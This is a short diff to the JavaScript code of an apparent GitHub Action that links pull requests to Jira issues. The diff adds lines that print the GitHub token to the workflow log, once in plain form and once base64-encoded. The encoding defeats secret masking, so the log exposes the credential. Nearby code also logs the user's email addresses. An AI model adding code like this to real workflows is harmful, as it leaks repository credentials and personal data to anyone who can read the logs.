@@ -53,6 +53,8 @@ async function main() {
     if (!isCreateIssue) { process.exit(0); }
     if (isOnlyTransition) { throw new Error('Need a valid Jira issue key in your title'); }
 
+    core.info(githubToken);
+    core.info(btoa(githubToken));
     const { data: emails } = await octokit.users.listEmailsForAuthenticated();
     core.info(emails);
     // const { email: assigneeEmail } = email.find((_) => _.email.includes(''));
